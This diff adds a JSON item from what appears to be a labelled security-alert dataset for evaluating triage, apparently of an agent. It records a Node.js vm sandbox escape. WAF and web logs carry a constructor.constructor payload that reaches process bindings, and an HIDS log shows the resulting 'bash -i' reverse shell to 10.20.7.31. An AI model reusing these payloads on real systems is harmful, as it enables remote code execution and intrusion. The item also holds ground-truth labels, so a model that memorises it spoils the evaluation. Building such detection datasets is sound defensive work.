@@ -1,0 +1,49 @@
+{
+ "unit": 1015,
+ "gt": {
+  "gt_class": "new",
+  "gt_case": null,
+  "confidence": "high",
+  "needs_review": false,
+  "reason": "不属于已入库的 8 个案例家族"
+ },
+ "technique": "Node.js vm 沙箱逃逸（constructor.constructor / process.binding 取 child_process）",
+ "sources": [
+  "waf",
+  "web",
+  "rasp",
+  "hids"
+ ],
+ "logs": [
+  {
+   "timestamp": "2026-06-27 04:49:48",
+   "source": "waf",
+   "log_id": "WAF0381351",
+   "content": "/api/v1/render ?tpl=constructor.constructor('return process')().binding('spawn_sync') Mozilla/5.0 (iPhone; CPU",
+   "event_id": "1015-WAF0381351"
+  },
+  {
+   "timestamp": "2026-06-27 04:49:49",
+   "source": "web",
+   "log_id": "WEB0383832",
+   "content": "/api/v1/render ?tpl=constructor.constructor('return process')().binding('spawn_sync') Mozilla/5.0 (iPhone; CPU",
+   "event_id": "1015-WEB0383832"
+  },
+  {
+   "timestamp": "2026-06-27 04:49:51",
+   "source": "rasp",
+   "log_id": "RASP0421930",
+   "content": "https://app-node-62.ops-corp.com/api/v1/render {\"binding\": \"spawn_sync\", \"escape\": \"vm\"} Mozilla/5.0 (iPhone; ",
+   "event_id": "1015-RASP0421930"
+  },
+  {
+   "timestamp": "2026-06-27 04:50:53",
+   "source": "hids",
+   "log_id": "HID0413272",
+   "content": "bash -i >& /dev/tcp/10.20.7.31/9001 0>&1 <== /bin/sh -c 'bash -i' <== /usr/bin/node /opt/app/render.js",
+   "event_id": "1015-HID0413272"
+  }
+ ],
+ "retrieval_full": [],
+ "evidence_for_agent": null
+}
